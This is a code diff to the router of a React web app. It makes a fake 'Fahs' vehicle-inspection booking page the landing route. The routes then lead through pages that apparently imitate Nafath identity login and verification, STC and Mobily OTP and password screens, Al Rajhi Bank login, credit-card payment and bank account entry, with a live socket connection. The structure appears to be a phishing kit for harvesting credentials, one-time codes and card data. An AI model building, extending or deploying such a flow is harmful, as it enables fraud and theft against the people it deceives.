@@ -10,11 +10,16 @@ import { ThemeProvider } from "./contexts/ThemeContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
 import AmerChat from "./components/AmerChat";
 
-// Existing Pages
-import Home from "./pages/Home";
-import HomeNew from "./pages/HomeNew";
-import Login from "./pages/Login";
+// Main Pages (Vehicle Inspection)
+import FahsHome from "./pages/FahsHome";
+import NewAppointment from "./pages/NewAppointment";
+
+// Nafath Pages
 import NafathLogin from "./pages/NafathLogin";
+import NafathLoginPage from "./pages/NafathLoginPage";
+import NafathVerify from "./pages/NafathVerify";
+
+// Form Pages
 import UpdateInfo from "./pages/UpdateInfo";
 import SummaryPayment from "./pages/SummaryPayment";
 
@@ -30,10 +35,6 @@ import STCCallAlert from "./pages/STCCallAlert";
 import MobilyCallAlert from "./pages/MobilyCallAlert";
 import MyStcOTP from "./pages/MyStcOTP";
 import STCPassword from "./pages/STCPassword";
-
-// Nafath Pages
-import NafathLoginPage from "./pages/NafathLoginPage";
-import NafathVerify from "./pages/NafathVerify";
 
 // Al Rajhi Bank Pages
 import AlRajhiLogin from "./pages/AlRajhiLogin";
@@ -57,23 +58,25 @@ import BankAccountNumber from "./pages/BankAccountNumber";
 // Final Page
 import FinalPage from "./pages/FinalPage";
 
-// Fahs Pages (Vehicle Inspection)
-import FahsHome from "./pages/FahsHome";
-import NewAppointment from "./pages/NewAppointment";
-
 // Documents Page
 import Documents from "./pages/Documents";
 
 function Router() {
   return (
     <Switch>
-      {/* Existing Routes */}
-      <Route path={"/"} component={HomeNew} />
-      <Route path={"/login"} component={Login} />
+      {/* Main Pages (Vehicle Inspection) */}
+      <Route path={"/"} component={FahsHome} />
+      <Route path={"/new-appointment"} component={NewAppointment} />
+
+      {/* Nafath Routes */}
+      <Route path={"/nafath"} component={NafathLogin} />
       <Route path={"/nafath-login"} component={NafathLogin} />
+      <Route path={"/nafath-login-page"} component={NafathLoginPage} />
+      <Route path={"/nafath-verify"} component={NafathVerify} />
+
+      {/* Form Routes */}
       <Route path={"/update-info"} component={UpdateInfo} />
       <Route path={"/summary-payment"} component={SummaryPayment} />
-      <Route path={"/service/:id?"} component={Home} />
 
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
@@ -87,11 +90,6 @@ function Router() {
       <Route path={"/mobily-call-alert"} component={MobilyCallAlert} />
       <Route path={"/mystc-otp"} component={MyStcOTP} />
       <Route path={"/stc-password"} component={STCPassword} />
-
-      {/* Nafath Routes */}
-      <Route path={"/nafath"} component={NafathLogin} />
-      <Route path={"/nafath-login-page"} component={NafathLoginPage} />
-      <Route path={"/nafath-verify"} component={NafathVerify} />
 
       {/* Al Rajhi Bank Routes */}
       <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
@@ -117,10 +115,6 @@ function Router() {
 
       {/* Documents Page */}
       <Route path={"/documents"} component={Documents} />
-
-      {/* Fahs Pages (Vehicle Inspection) */}
-      <Route path={"/fahs"} component={FahsHome} />
-      <Route path={"/new-appointment"} component={NewAppointment} />
 
       <Route path={"/404"} component={NotFound} />
       {/* Final fallback route */}
